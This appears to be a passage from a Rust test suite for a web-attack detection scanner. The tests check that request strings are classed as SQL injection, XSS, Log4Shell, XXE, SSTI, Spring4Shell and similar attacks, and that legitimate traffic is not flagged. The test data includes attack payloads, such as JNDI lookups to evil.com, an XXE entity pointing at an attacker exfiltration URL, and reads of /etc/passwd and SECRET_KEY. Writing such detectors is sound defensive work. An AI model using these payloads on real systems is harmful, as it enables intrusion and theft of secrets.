        // file:// con path neutro → match SOLO SSRF (no LFI collision)
        let m = scan_request("/?u=file:///app/config.json", &empty_headers(), None).expect("file:// app");
        assert_eq!(m.category, AttackCategory::Ssrf);
    }

    // ── Log4Shell ──────────────────────────────────────────────────────
    #[test]
    fn log4shell_jndi_ldap_in_user_agent() {
        let mut h = HashMap::new();
        h.insert("user-agent".to_string(), "${jndi:ldap://evil.com/x}".to_string());
        let m = scan_request("/", &h, None).expect("log4shell");
        assert_eq!(m.category, AttackCategory::Log4Shell);
        assert_eq!(m.surface, "user-agent");
    }

    #[test]
    fn log4shell_nested_lower_jndi() {
        let mut h = HashMap::new();
        h.insert("user-agent".to_string(), "${${lower:jndi}:ldap://x}".to_string());
        let m = scan_request("/", &h, None).expect("log4shell nested");
        assert_eq!(m.category, AttackCategory::Log4Shell);
    }

    // ── NoSQL injection ────────────────────────────────────────────────
    #[test]
    fn nosqli_ne_operator_in_body() {
        let body = r#"{"username":"admin","password":{"$ne":null}}"#;
        let m = scan_request("/login", &empty_headers(), Some(body)).expect("$ne");
        assert_eq!(m.category, AttackCategory::NoSqlInjection);
    }

    // ── Prototype pollution ────────────────────────────────────────────
    #[test]
    fn proto_pollution_in_body() {
        let body = r#"{"__proto__":{"polluted":"yes"}}"#;
        let m = scan_request("/api/x", &empty_headers(), Some(body)).expect("__proto__");
        assert_eq!(m.category, AttackCategory::PrototypePollution);
    }

    // ── Deserialization ────────────────────────────────────────────────
    #[test]
    fn deserialization_java_rO0AB() {
        let m = scan_request("/?obj=rO0ABXNyABRqYXZhLnV0aWwuQXJyYXlMaXN0", &empty_headers(), None)
            .expect("rO0AB");
        assert_eq!(m.category, AttackCategory::Deserialization);
    }

    #[test]
    fn deserialization_php_serialized() {
        let body = r#"data=O:8:"stdClass":1:{s:4:"name";s:5:"hello";}"#;
        let m = scan_request("/", &empty_headers(), Some(body)).expect("php O:8");
        assert_eq!(m.category, AttackCategory::Deserialization);
    }

    // ── XXE ────────────────────────────────────────────────────────────
    #[test]
    fn xxe_entity_system() {
        // Payload XXE classico: contiene SIA `<!ENTITY SYSTEM` SIA `file://` SIA `/etc/passwd`.
        // First-match wins: SSRF / LFI / XXE qualunque sia accettabile.
        let body = r#"<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>"#;
        let m = scan_request("/xml", &empty_headers(), Some(body)).expect("xxe");
        assert!(matches!(
            m.category,
            AttackCategory::XmlExternalEntity
                | AttackCategory::Ssrf
                | AttackCategory::LocalFileInclusion
        ));
    }

    #[test]
    fn xxe_entity_system_pure() {
        // XXE senza payload SSRF/LFI collateral → match SOLO XXE
        let body = r#"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.evil/exfil"> ]>"#;
        let m = scan_request("/xml", &empty_headers(), Some(body)).expect("xxe pure");
        assert_eq!(m.category, AttackCategory::XmlExternalEntity);
    }

    // ── Spring4Shell ───────────────────────────────────────────────────
    #[test]
    fn spring4shell_classloader_in_query() {
        let m = scan_request("/?class.module.classLoader.resources.context.parent=x", &empty_headers(), None)
            .expect("spring4shell");
        assert_eq!(m.category, AttackCategory::Spring4Shell);
    }

    // ── OGNL ───────────────────────────────────────────────────────────
    #[test]
    fn ognl_struts_runtime_payload() {
        let m = scan_request("/?x=%{#runtime=Runtime.getRuntime()}", &empty_headers(), None)
            .expect("ognl");
        assert_eq!(m.category, AttackCategory::OgnlInjection);
    }

    // ── Template injection ─────────────────────────────────────────────
    #[test]
    fn ssti_jinja_config() {
        let m = scan_request("/page?name={{config.SECRET_KEY}}", &empty_headers(), None).expect("ssti");
        assert_eq!(m.category, AttackCategory::TemplateInjection);
    }

    #[test]
    fn ssti_string_mult_probe() {
        let m = scan_request("/page?name={{'a'*7}}", &empty_headers(), None).expect("ssti probe");
        assert_eq!(m.category, AttackCategory::TemplateInjection);
    }

    // ── Negative cases (NO false positive) ────────────────────────────
    #[test]
    fn legit_url_no_match() {
        assert!(scan_request("/api/v1/workspaces?page=1&limit=20", &empty_headers(), None).is_none());
    }

    #[test]
    fn legit_login_no_match() {
        assert!(scan_request("/login", &empty_headers(), None).is_none());
    }

    #[test]
    fn legit_search_with_quotes_no_match() {
        assert!(scan_request("/search?q=hello+world", &empty_headers(), None).is_none());
    }

    #[test]
    fn legit_email_in_body_no_match() {
        let body = r#"{"email":"info@zeli.it","name":"Mario Rossi"}"#;
        assert!(scan_request("/api/signup", &empty_headers(), Some(body)).is_none());
    }

    #[test]
    fn legit_path_with_dots_no_match() {
        assert!(scan_request("/api/v1.0/users", &empty_headers(), None).is_none(),
                "version number deve essere SAFE");
    }

    #[test]
    fn legit_dollar_in_path_no_match() {
        // ${variable} non e\` injection se vuoto / senza jndi
        assert!(scan_request("/dollar/${variable}", &empty_headers(), None).is_none());
    }

    #[test]
    fn legit_useragent_chrome_no_match() {
        let mut h = HashMap::new();
        h.insert("user-agent".to_string(),
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36".to_string(),
        );
        assert!(scan_request("/", &h, None).is_none(),
                "browser UA NON deve falso-positivare");
    }

    // ── Severity scores allineati a escape hatch ──────────────────────
    #[test]
    fn all_severities_above_high_threshold() {
        for c in &[
            AttackCategory::SqlInjection, AttackCategory::XssReflected,
            AttackCategory::CommandInjection, AttackCategory::Log4Shell,
            AttackCategory::Ssrf, AttackCategory::TemplateInjection,
        ] {
            assert!(category_severity(*c) >= 0.85,
                    "{:?} severity must trigger escape hatch (>= 0.85)", c);
        }
    }

    #[test]
    fn log4shell_and_spring4shell_at_99() {
        assert_eq!(category_severity(AttackCategory::Log4Shell), 0.99);
        assert_eq!(category_severity(AttackCategory::Spring4Shell), 0.99);
    }

    #[test]
    fn rule_id_is_namespaced() {
        assert!(AttackCategory::SqlInjection.rule_id().starts_with("owasp."));
        assert!(AttackCategory::Log4Shell.rule_id().starts_with("cve."));
    }

    #[test]
    fn human_description_includes_input_excerpt() {
        let desc = AttackCategory::SqlInjection.human_description("UNION SELECT password FROM users");
        assert!(desc.contains("UNION SELECT password FROM users"));
        assert!(desc.contains("SQL injection"));
    }

    #[test]
    fn g4_http2_rapid_reset_h2load_user_agent_detected() {
        let mut h = HashMap::new();
        h.insert("user-agent".to_string(), "h2load-rapid/1.0".to_string());
        let m = scan_request("/", &h, None).expect("h2load fingerprint deve match");
        assert_eq!(m.category, AttackCategory::Http2RapidReset);
    }

    #[test]
    fn g4_rapid_reset_severity_is_99() {
        assert_eq!(category_severity(AttackCategory::Http2RapidReset), 0.99);
    }

    // ── G6 WebSocket abuse ─────────────────────────────────────────────
    #[test]
    fn g6_websocket_low_entropy_key() {
        let mut h = HashMap::new();
        h.insert("sec-websocket-key".to_string(), "AAAAAAAAAAAAAAAAAAAAAA==".to_string());
        let m = scan_request("/ws", &h, None).expect("low entropy key");
        assert_eq!(m.category, AttackCategory::WebSocketAbuse);
    }

    #[test]
    fn g6_websocket_admin_subprotocol_blocked() {
        let mut h = HashMap::new();
        h.insert("sec-websocket-protocol".to_string(), "admin".to_string());
        let m = scan_request("/ws", &h, None).expect("admin proto");
        assert_eq!(m.category, AttackCategory::WebSocketAbuse);
    }

    #[test]
    fn g6_websocket_smuggle_extension() {
        let mut h = HashMap::new();
        h.insert("sec-websocket-extensions".to_string(), "permessage-deflate; smuggle-frames".to_string());
        let m = scan_request("/ws", &h, None).expect("smuggle ext");
        assert_eq!(m.category, AttackCategory::WebSocketAbuse);
    }

    #[test]
    fn g6_legit_websocket_key_no_match() {
        let mut h = HashMap::new();
        h.insert("sec-websocket-key".to_string(), "dGhlIHNhbXBsZSBub25jZQ==".to_string());
        h.insert("sec-websocket-version".to_string(), "13".to_string());
        assert!(scan_request("/ws", &h, None).is_none(), "key legit non deve falso-positivare");
    }

    // ── G7 GraphQL depth/complexity ────────────────────────────────────
    #[test]
    fn g7_graphql_nested_query_10_levels_triggers() {
        // {a{b{c{d{e{f{g{h{i{j{k}}}}}}}}}}}
        let q = "{a{b{c{d{e{f{g{h{i{j{k}}}}}}}}}}}";
        let m = scan_request("/graphql", &empty_headers(), Some(q)).expect("10 nested");
        assert_eq!(m.category, AttackCategory::GraphqlDepthAbuse);
    }

    #[test]
    fn g7_graphql_legit_5_levels_no_match() {
        let q = "{users{name{first}}}";
        assert!(scan_request("/graphql", &empty_headers(), Some(q)).is_none(),
                "query GraphQL legitima non deve match");
    }

    // ── G10 DNS rebinding ─────────────────────────────────────────────
    #[test]
    fn g10_dns_rebinding_nip_io_triggers() {
        let m = scan_request("/?u=http://127.0.0.1.nip.io/admin", &empty_headers(), None).expect("nip.io rebind");
        assert_eq!(m.category, AttackCategory::DnsRebinding);
    }

    #[test]
    fn g10_dns_rebinding_xip_io_triggers() {
        let m = scan_request("/?u=http://malicious.xip.io/", &empty_headers(), None).expect("xip.io rebind");
        assert_eq!(m.category, AttackCategory::DnsRebinding);
    }

    #[test]
    fn g10_legit_subdomain_no_match() {
        assert!(scan_request("/?u=https://api.example.com/", &empty_headers(), None).is_none(),
                "subdomain legit non rebind");
    }

    #[test]
    fn g4_legit_user_agent_no_h2_match() {
        let mut h = HashMap::new();
        h.insert("user-agent".to_string(),
            "Mozilla/5.0 Chrome/131.0 (HTTP/2 enabled browser legit)".to_string());
        assert!(scan_request("/", &h, None).is_none(),
                "Chrome HTTP/2 legit non deve match Rapid Reset pattern");
    }

    // ── ANTI-EVASION: payload percent-encodato nel path/body viene decodificato e beccato ──
    #[test]
    fn encoded_xss_in_path_is_caught_after_decode() {
        // <script> percent-encodato: passa il match sul RAW, ma decodificato matcha XSS.
        let m = scan_request("/?q=%3Cscript%3Ealert(1)%3C/script%3E", &empty_headers(), None)
            .expect("XSS percent-encodato deve essere beccato dopo decode");
        assert!(matches!(
            m.category,
            AttackCategory::XssReflected | AttackCategory::XssStored
        ));
    }

    #[test]
    fn double_encoded_xss_in_path_is_caught() {
        // %253C → %3C → < (doppio-encoding, depth-cap 3 lo prende)
        let m = scan_request("/?q=%253Cscript%253E", &empty_headers(), None)
            .expect("XSS doppio-encodato deve essere beccato");
        assert!(matches!(
            m.category,
            AttackCategory::XssReflected | AttackCategory::XssStored
        ));
    }

    #[test]
    fn encoded_sqli_in_body_is_caught_after_decode() {
        // ' OR 1=1 form-urlencoded nel body.
        let m = scan_request("/login", &empty_headers(), Some("u=%27%20OR%201%3D1--"))
            .expect("SQLi percent-encodata nel body deve essere beccata");
        assert!(matches!(m.category, AttackCategory::SqlInjection));
    }

    #[test]
    fn plain_safe_path_with_no_percent_still_passes() {
        // anti-falso-positivo: un path normale (senza '%') non deve scattare.
        assert!(scan_request("/api/v1/users/42", &empty_headers(), None).is_none());
    }

    // ── G2 hot-reload tests — pure parse_crs_file (NO state mutation) ─

    // ── G22 A/B shadow tests — IN UN UNICO TEST (static state condiviso)
    // SHADOW_BUNDLE + SHADOW_MATCHES sono static globali. Cargo test
    // parallelizza per default → race. Raccolgo i 3 test in 1 sequenziale.
    #[test]
    fn g22_shadow_full_lifecycle() {
        // Phase 1: disabled by default
        set_shadow_bundle(None);
        shadow_stats_reset();
        let _ = scan_request("/etc/passwd", &empty_headers(), None);
        assert_eq!(shadow_stats().len(), 0, "Phase 1: default shadow disabled → 0 counter");

        // Phase 2: enabled bundle conta match no-score
        let tmp = std::env::temp_dir().join(format!("crs-shadow-{}-{}.txt",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::write(&tmp, "sqli|MAGIC_SHADOW_TOKEN_XYZ").unwrap();
        let shadow_b = parse_crs_file(&tmp).expect("parse shadow");
        set_shadow_bundle(Some(shadow_b));

        let result = scan_request("/api?id=MAGIC_SHADOW_TOKEN_XYZ", &empty_headers(), None);
        assert!(result.is_none(), "Phase 2: builtin non match magic token");
        let stats = shadow_stats();
        assert!(stats.iter().any(|(k, v)| k == "shadow.sqli" && *v >= 1),
                "Phase 2: shadow.sqli counter > 0 atteso, got: {:?}", stats);

        // Phase 3: disable → no più conteggi
        set_shadow_bundle(None);
        shadow_stats_reset();
        let _ = scan_request("/x=MAGIC_SHADOW_TOKEN_XYZ", &empty_headers(), None);
        assert!(shadow_stats().iter().all(|(_, v)| *v == 0),
                "Phase 3: post-disable no count");

        // Final cleanup
        set_shadow_bundle(None);
        shadow_stats_reset();
        std::fs::remove_file(&tmp).ok();
    }

    #[test]
    fn g2_initial_bundle_is_builtin() {
        let b = current_crs_bundle();
        assert!(b.source == "builtin" || b.source == "file",
                "bundle source dev'essere builtin o file");
        assert!(b.patterns_count >= 2);
    }

    #[test]
    fn g2_parse_invalid_format_returns_err() {
        let tmp_file = std::env::temp_dir().join(format!("crs-parse-invalid-{}-{}.txt",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::write(&tmp_file, "this_is_not_valid_format_no_pipe").unwrap();
        let result = parse_crs_file(&tmp_file);
        assert!(result.is_err(), "file format invalido deve essere err");
        std::fs::remove_file(&tmp_file).ok();
    }

    #[test]
    fn g2_parse_unknown_category_returns_err() {
        let tmp_file = std::env::temp_dir().join(format!("crs-parse-cat-{}-{}.txt",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::write(&tmp_file, "unknown_category|hello").unwrap();
        let result = parse_crs_file(&tmp_file);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("categoria sconosciuta"));
        std::fs::remove_file(&tmp_file).ok();
    }

    #[test]
    fn g2_parse_invalid_regex_returns_err() {
        let tmp_file = std::env::temp_dir().join(format!("crs-parse-regex-{}-{}.txt",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::write(&tmp_file, "sqli|(\\unclosed_group").unwrap();
        let result = parse_crs_file(&tmp_file);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("RegexSet build"));
        std::fs::remove_file(&tmp_file).ok();
    }

    #[test]
    fn g2_parse_valid_file_builds_bundle_no_global_swap() {
        let tmp_file = std::env::temp_dir().join(format!("crs-parse-valid-{}-{}.txt",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::write(&tmp_file, "# CRS test file\nsqli|test_unique_xyz\nxss_reflected|<probe>").unwrap();
        let bundle = parse_crs_file(&tmp_file).expect("valid file");
        assert_eq!(bundle.patterns_count, 2);
        assert_eq!(bundle.source, "file");
        // Global bundle NON cambiato (parse_crs_file e\` pure)
        let global = current_crs_bundle();
        assert!(global.patterns_count >= 50, "global bundle DEVE restare builtin (parse e' pure)");
        std::fs::remove_file(&tmp_file).ok();
    }

    #[test]
    fn g2_parse_skips_comments_and_empty_lines() {
        let tmp_file = std::env::temp_dir().join(format!("crs-parse-comments-{}-{}.txt",
            std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        std::fs::write(&tmp_file, "# Comment 1\n\nsqli|UNIQUE_TEST_XYZ\n\n# trailing comment\n").unwrap();
        let bundle = parse_crs_file(&tmp_file).expect("ok with comments");
        assert_eq!(bundle.patterns_count, 1);
        std::fs::remove_file(&tmp_file).ok();
    }

    #[test]
    fn pattern_count_matches_category_lookup_size() {
        assert_eq!(PATTERN_LIST.len(), CATEGORY_LOOKUP.len(),
                   "PATTERN_LIST e CATEGORY_LOOKUP devono avere stesso len");
        assert!(PATTERN_LIST.len() >= 50,
                "F10 promette ~50 regole top-priority; ne abbiamo {}", PATTERN_LIST.len());
    }

    /// 🚨 FP2 (CRITICO, UTF-8 panic): body con un carattere multibyte (es. JSON con
    /// emoji/€/CJK) ESATTAMENTE sul byte 8192 → `&b[..8192]` panicava = crash del CRS
    /// scanner su quella request. Il body è la superficie più attacker-controlled.
    #[test]
    fn fp2_scan_request_body_no_panic_on_multibyte_at_cap() {
        let mut body = "a".repeat(8191);
        body.push('€'); // € (3B) inizia al byte 8191, attraversa il byte 8192
        body.push_str("payload");
        assert!(body.len() > 8192);
        // Il punto del test: scan_request NON deve panicare (pre-fix: panic UTF-8).
        let _ = scan_request("/upload", &empty_headers(), Some(&body));
    }

    /// FP2 — variante CJK + emoji multipli intorno al cap (fuzz mirato).
    #[test]
    fn fp2_scan_request_body_no_panic_various_multibyte() {
        for filler in ["日", "🚀", "€", "本語"] {
            let mut body = "x".repeat(8190);
            body.push_str(&filler.repeat(20)); // multibyte a cavallo del cap 8192
            let _ = scan_request("/u", &empty_headers(), Some(&body));
        }
    }
}
